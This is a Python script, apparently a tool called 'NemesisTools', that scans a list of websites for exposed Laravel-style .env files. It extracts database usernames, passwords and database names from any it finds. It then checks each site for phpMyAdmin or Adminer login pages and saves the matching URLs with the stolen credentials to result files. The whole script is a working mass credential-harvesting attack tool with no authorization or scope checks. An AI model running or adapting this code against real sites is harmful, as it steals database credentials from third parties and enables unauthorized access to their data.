import urllib.request, urllib.error, urllib.parse,sys
import requests
import re
import os
from termcolor import colored
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

#collor
white = "\033[97m"
Red = "\033[31m"
Green = "\033[32m"
Yellow = "\033[33m"
Blue = "\033[34m"
Magenta = "\033[35m"
Cyan = "\033[36m"
LightGray = "\033[37m"
DarkGray = "\033[90m"
LightRed = "\033[91m"
LightGreen = "\033[92m"
LightYellow = "\033[93m"
LightBlue = "\033[94m"
LightMagenta = "\033[95m"
LightCyan = "\033[96m"

os.system("cls")
banner ="""

    _   __                         _     ______            __    
   / | / /__  ____ ___  ___  _____(_)___/_  __/___  ____  / /____
  /  |/ / _ \/ __ `__ \/ _ \/ ___/ / ___// / / __ \/ __ \/ / ___/
 / /|  /  __/ / / / / /  __(__  ) (__  )/ / / /_/ / /_/ / (__  ) 
/_/ |_/\___/_/ /_/ /_/\___/____/_/____//_/  \____/\____/_/____/
"""
print (banner)
def check(site):
    try:
        site = site.strip()
        op = requests.get("http://"+str(site)+"/.env",timeout=7)
        if 'DB_PASSWORD=' in op.text:
            dbuser = str(re.findall('DB_USERNAME=(.*)', op.text)[0]).split("''")[0]
            dbpass = str(re.findall('DB_PASSWORD=(.*)', op.text)[0]).split("''")[0]
            dbname = str(re.findall('DB_DATABASE=(.*)', op.text)[0]).split("''")[0]
            ho = ['/adminer.php','/Adminer.php','/phpmyadmin']
            for hh in ho:
                try:
                    kk = requests.get('http://'+str(site)+hh,timeout=7)
                    if 'phpmyadmin.net' in kk.text:
                        print(('\033[32m[+] FOUND_PHPMYADMIN> \033[97m'+'URL={}'.format(site)+'{} |'.format(hh)+' DB_user={} |'.format(dbuser)+' DB_pass={}'.format(dbpass)))
                        pm = open('Result/phpmyadmin.txt','a').write('\nURL={}'.format(site)+'{} |'.format(hh)+'{}|'.format(dbuser)+'{}|'.format(dbpass)+'{}'.format(dbname))
                    elif 'Login - Adminer' in kk.text:
                        print(('\033[32m[+] FOUND_Adminer> \033[97m'+'URL={}'.format(site)+'{} |'.format(hh)+' DB_user={} |'.format(dbuser)+' DB_pass={}'.format(dbpass)))
                        ad = open('Result/adminer.txt','a').write('\nURL={}'.format(site)+'{} |'.format(hh)+'{}|'.format(dbuser)+'{}|'.format(dbpass)+'{}'.format(dbname))
                    else:
                        pass
                except:
                    pass
    except:
        pass


ListPass = open(sys.argv[1], 'r').readlines()
pool = ThreadPool(50)
pool.map(check, ListPass)
pool.close()
pool.join()

if __name__ == '__main__':     
    print("\nTask Completed")